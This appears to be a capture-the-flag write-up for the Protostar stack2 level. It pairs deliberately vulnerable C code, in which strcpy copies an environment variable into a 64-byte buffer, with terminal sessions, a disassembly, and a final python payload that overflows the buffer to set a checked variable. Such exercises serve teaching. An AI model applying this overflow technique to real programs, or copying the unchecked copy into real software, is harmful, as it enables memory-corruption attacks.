
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

First we run the program:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack2                                    
stack2: please set the GREENIE environment variable
```

As we knew from the code we need to set the environment variable:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ export GREENIE=Hello                           
                                                                                                                             
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack2            
Try again, you got 0x00000000
```

The buffer in 64 characters this time too. Let's just put a 64+4 character string in the environment variable:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ export GREENIE=1234567890123456789012345678901234567890123456789012345678901234abcd
                                                                                                                             
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack2                                                                           
Try again, you got 0x64636261
```

Nice, our extra characters ended up where they should. Next, lets get the right characters. We can cheat be disassembling it again ;D
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ r2 -d -A stack2
...
[0xf7fc85b0]> pdf @main
            ; DATA XREF from entry0 @ 0x80483f7(w)
┌ 128: int main (int argc, char **argv, char **envp);
│           ; var int32_t var_4h @ esp+0x4
│           ; var int32_t var_18h @ esp+0x18
│           ; var int32_t var_58h @ esp+0x58
│           ; var int32_t var_5ch @ esp+0x5c
│           0x08048494      55             push ebp
│           0x08048495      89e5           mov ebp, esp
│           0x08048497      83e4f0         and esp, 0xfffffff0
│           0x0804849a      83ec60         sub esp, 0x60
│           0x0804849d      c70424e085..   mov dword [esp], str.GREENIE ; [0x80485e0:4]=0x45455247 ; "GREENIE"
│           0x080484a4      e8d3feffff     call sym.imp.getenv         ; char *getenv(const char *name)
│           0x080484a9      8944245c       mov dword [var_5ch], eax
│           0x080484ad      837c245c00     cmp dword [var_5ch], 0
│       ┌─< 0x080484b2      7514           jne 0x80484c8
│       │   0x080484b4      c7442404e8..   mov dword [var_4h], str.please_set_the_GREENIE_environment_variable_n ; [0x80485e8:4]=0x61656c70 ; "please set the GREENIE environment variable\n"                                                             
│       │   0x080484bc      c704240100..   mov dword [esp], 1
│       │   0x080484c3      e8f4feffff     call sym.imp.errx           ; void errx(int eval)
│       └─> 0x080484c8      c744245800..   mov dword [var_58h], 0
│           0x080484d0      8b44245c       mov eax, dword [var_5ch]
│           0x080484d4      89442404       mov dword [var_4h], eax
│           0x080484d8      8d442418       lea eax, [var_18h]
│           0x080484dc      890424         mov dword [esp], eax
│           0x080484df      e8b8feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484e4      8b442458       mov eax, dword [var_58h]
│           0x080484e8      3d0a0d0a0d     cmp eax, 0xd0a0d0a          ; '\n\r\n\r'
│       ┌─< 0x080484ed      750e           jne 0x80484fd
│       │   0x080484ef      c704241886..   mov dword [esp], str.you_have_correctly_modified_the_variable ; [0x8048618:4]=0x20756f79 ; "you have correctly modified the variable"                                                                          
│       │   0x080484f6      e8d1feffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x080484fb      eb15           jmp 0x8048512
│      │└─> 0x080484fd      8b542458       mov edx, dword [var_58h]
│      │    0x08048501      b841860408     mov eax, str.Try_again__you_got_0x_08x_n ; str.Try_again__you_got_0x_08x_n
│      │                                                               ; 0x8048641 ; "Try again, you got 0x%08x\n"           
│      │    0x08048506      89542404       mov dword [var_4h], edx
│      │    0x0804850a      890424         mov dword [esp], eax
│      │    0x0804850d      e89afeffff     call sym.imp.printf         ; int printf(const char *format)
│      │    ; CODE XREF from main @ 0x80484fb(x)
│      └──> 0x08048512      c9             leave
└           0x08048513      c3             ret
```

Ah, `'\n\r\n\r'` is the goal string. Let's update our sting.
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ export GREENIE=1234567890123456789012345678901234567890123456789012345678901234\n\r\n\r
                                                                                                                             
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack2                                                                               
Try again, you got 0x726e726e
```

As we can see the special characters were not correctly put in the environment variable: Let's use python:
```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ export GREENIE=$(python -c "print('a'*64+'\n\r\n\r')")
                                                                                                                             
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack2                                              
you have correctly modified the variable
```

There, we got it.